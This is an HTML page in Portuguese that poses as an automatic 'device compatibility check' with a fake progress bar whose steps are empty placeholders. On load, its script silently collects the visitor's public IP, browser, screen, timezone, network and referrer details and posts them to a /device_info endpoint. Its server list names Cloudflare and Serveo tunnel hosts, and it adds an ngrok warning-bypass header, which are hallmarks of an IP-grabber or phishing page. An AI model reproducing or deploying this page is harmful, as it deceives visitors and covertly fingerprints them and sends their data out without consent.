<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica√ß√£o de Compatibilidade</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
            position: relative;
        }
        
        .header {
            background: linear-gradient(45deg, #1e3c72, #2a5298);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: repeating-linear-gradient(
                45deg,
                transparent,
                transparent 10px,
                rgba(255,255,255,0.05) 10px,
                rgba(255,255,255,0.05) 20px
            );
            animation: slide 20s linear infinite;
        }
        
        @keyframes slide {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        .header-content {
            position: relative;
            z-index: 1;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
            font-weight: 300;
        }
        
        .verification-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .content {
            padding: 40px 30px;
            text-align: center;
        }
        
        .status-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 500;
        }
        
        .progress-container {
            margin-bottom: 30px;
        }
        
        .progress-bar {
            background: #e9ecef;
            border-radius: 25px;
            height: 12px;
            overflow: hidden;
            position: relative;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .progress-fill {
            background: linear-gradient(45deg, #28a745, #20c997, #17a2b8);
            background-size: 30px 30px;
            height: 100%;
            width: 0%;
            transition: width 0.8s ease;
            position: relative;
            border-radius: 25px;
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { background-position: -30px 0; }
            100% { background-position: 30px 0; }
        }
        
        .progress-text {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
            font-weight: 500;
        }
        
        .verification-steps {
            text-align: left;
            margin: 30px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            padding: 12px 0;
            font-size: 14px;
            color: #666;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .step:last-child {
            border-bottom: none;
        }
        
        .step-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-size: 12px;
            font-weight: bold;
            background: #e9ecef;
            color: #666;
            transition: all 0.5s ease;
        }
        
        .step.active .step-icon {
            background: #007bff;
            color: white;
            animation: bounce 0.5s ease;
        }
        
        .step.completed .step-icon {
            background: #28a745;
            color: white;
        }
        
        @keyframes bounce {
            0%, 20%, 60%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            80% { transform: translateY(-5px); }
        }
        
        .step-text {
            flex: 1;
        }
        
        .step.completed .step-text {
            color: #28a745;
            font-weight: 500;
        }
        
        .hidden {
            display: none !important;
        }
        
        .success-screen {
            text-align: center;
            padding: 40px 30px;
        }
        
        .success-icon {
            font-size: 80px;
            color: #28a745;
            margin-bottom: 20px;
            animation: successPulse 1s ease-in-out;
        }
        
        @keyframes successPulse {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .success-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .success-description {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .continue-button {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .continue-button:hover {
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(40,167,69,0.3);
        }
        
        .session-info {
            font-size: 12px;
            opacity: 0.6;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Tela de Progresso -->
        <div id="progressScreen">
            <div class="header">
                <div class="header-content">
                    <div class="verification-icon">‚öôÔ∏è</div>
                    <h1>Verificando Dispositivo</h1>
                    <p>Analisando compatibilidade automaticamente</p>
                </div>
            </div>
            
            <div class="content">
                <div class="status-text" id="progressStatusText">
                    Iniciando verifica√ß√£o...
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">0% conclu√≠do</div>
                </div>
                
                <div class="verification-steps">
                    <div class="step" id="progress-step1">
                        <div class="step-icon">1</div>
                        <div class="step-text">Verificando navegador e sistema operacional</div>
                    </div>
                    <div class="step" id="progress-step2">
                        <div class="step-icon">2</div>
                        <div class="step-text">Coletando informa√ß√µes t√©cnicas</div>
                    </div>
                    <div class="step" id="progress-step3">
                        <div class="step-icon">3</div>
                        <div class="step-text">Verificando conectividade</div>
                    </div>
                    <div class="step" id="progress-step4">
                        <div class="step-icon">4</div>
                        <div class="step-text">Finalizando verifica√ß√£o</div>
                    </div>
                </div>
                
                <div class="session-info">
                    Sess√£o: <span id="sessionId"></span>
                </div>
            </div>
        </div>
        
        <!-- Tela de Sucesso -->
        <div id="successScreen" class="hidden">
            <div class="success-screen">
                <div class="success-icon">‚úÖ</div>
                <div class="success-title">Verifica√ß√£o Conclu√≠da!</div>
                <div class="success-description">
                    Seu dispositivo √© totalmente compat√≠vel com nossos recursos. 
                    Todas as funcionalidades est√£o dispon√≠veis e funcionando perfeitamente.
                </div>
                <button class="continue-button" onclick="redirectToApp()">
                    Continuar para o Aplicativo
                </button>
            </div>
        </div>
    </div>

    <script>
        // *** CONFIGURA√á√ÉO CRUCIAL: URLs dos servidores ***
        const SERVER_URLS = [
            'https://painting-combining-serial-sandy.trycloudflare.com',
            'https://socialdivulga.serveo.net',
            'http://127.0.0.1:8000'  // Localhost para testes
        ];   
        
        // Gerar um ID de sess√£o √∫nico
        function generateSessionId() {
            return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }
        
        const sessionId = generateSessionId();
        document.getElementById('sessionId').textContent = sessionId;
        
        let currentStep = 0;
        
        // Obter o IP p√∫blico usando uma API externa
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Erro ao obter IP:", error);
                return "N√£o foi poss√≠vel obter o IP";
            }
        }
        
        // Fun√ß√£o para fazer requisi√ß√µes com headers personalizados
        function customFetch(url, options = {}) {
            options.headers = options.headers || {};
            options.headers["ngrok-skip-browser-warning"] = "true";
            return fetch(url, options);
        }

        // Coleta de informa√ß√µes do dispositivo
        async function collectDeviceInfo() {
            try {
                const publicIP = await getPublicIP();
                
                const deviceInfo = {
                    session_id: sessionId,
                    timestamp: new Date().toISOString(),
                    ip_address: publicIP,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    },
                    browser: {
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        languages: navigator.languages,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        vendor: navigator.vendor || 'unknown'
                    },
                    window: {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        location: window.location.href,
                        referrer: document.referrer || 'none'
                    },
                    platform: {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset()
                    },
                    network: {
                        connection: navigator.connection ? {
                            effectiveType: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt,
                            saveData: navigator.connection.saveData
                        } : 'unavailable'
                    },
                    media: {
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                        pdfViewer: navigator.pdfViewerEnabled || false
                    },
                    storage: {
                        localStorage: typeof(Storage) !== "undefined",
                        sessionStorage: typeof(Storage) !== "undefined",
                        cookies: navigator.cookieEnabled
                    }
                };

                // Enviar dados para o servidor
                customFetch("/device_info", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(deviceInfo)
                }).catch(error => {
                    console.log("Erro ao enviar informa√ß√µes:", error);
                });
            } catch (error) {
                console.log("Erro ao coletar informa√ß√µes:", error);
            }
        }

        const steps = [
            {
                text: "Verificando navegador e sistema operacional...",
                duration: 1500,
                action: () => {} // A√ß√£o vazia, a coleta √© feita separadamente
            },
            {
                text: "Coletando informa√ß√µes t√©cnicas...",
                duration: 2000,
                action: () => {}
            },
            {
                text: "Verificando conectividade...",
                duration: 1500,
                action: () => {}
            },
            {
                text: "Finalizando verifica√ß√£o...",
                duration: 1500,
                action: () => {}
            }
        ];
        
        function startVerification() {
            currentStep = 0;
            runVerificationStep();
            
            // Iniciar coleta de dados
            collectDeviceInfo();
        }
        
        function runVerificationStep() {
            if (currentStep >= steps.length) {
                return;
            }
            
            const step = steps[currentStep];
            
            // Atualizar texto de status
            document.getElementById('progressStatusText').textContent = step.text;
            
            // Marcar step como ativo
            const stepElement = document.getElementById(`progress-step${currentStep + 1}`);
            stepElement.classList.add('active');
            
            // Executar a√ß√£o do step (se houver)
            if (step.action) step.action();
            
            // Simular progresso
            const targetProgress = ((currentStep + 1) / steps.length) * 100;
            animateProgress(targetProgress);
            
            // Aguardar dura√ß√£o do step
            setTimeout(() => {
                // Marcar step como completo
                stepElement.classList.remove('active');
                stepElement.classList.add('completed');
                
                currentStep++;
                
                // Se for o √∫ltimo step, mostrar tela de sucesso
                if (currentStep >= steps.length) {
                    setTimeout(() => {
                        showSuccessScreen();
                    }, 500);
                } else {
                    runVerificationStep();
                }
            }, step.duration);
        }
        
        function animateProgress(targetPercent) {
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            const currentPercent = parseInt(progressFill.style.width) || 0;
            const increment = (targetPercent - currentPercent) / 20;
            
            let current = currentPercent;
            const interval = setInterval(() => {
                current += increment;
                if (current >= targetPercent) {
                    current = targetPercent;
                    clearInterval(interval);
                }
                
                progressFill.style.width = current + '%';
                progressText.textContent = Math.round(current) + '% conclu√≠do';
            }, 50);
        }
        
        function showSuccessScreen() {
            document.getElementById('progressScreen').classList.add('hidden');
            document.getElementById('successScreen').classList.remove('hidden');
        }
        
        function redirectToApp() {
            alert('üéâ Redirecionando para o aplicativo principal!');
            // Aqui voc√™ pode redirecionar para outra p√°gina ou mostrar o conte√∫do principal
            // window.location.href = '/main';
        }
        
        // Iniciar automaticamente quando a p√°gina carrega
        window.addEventListener('load', function() {
            startVerification();
        });
    </script>
</body>
</html>

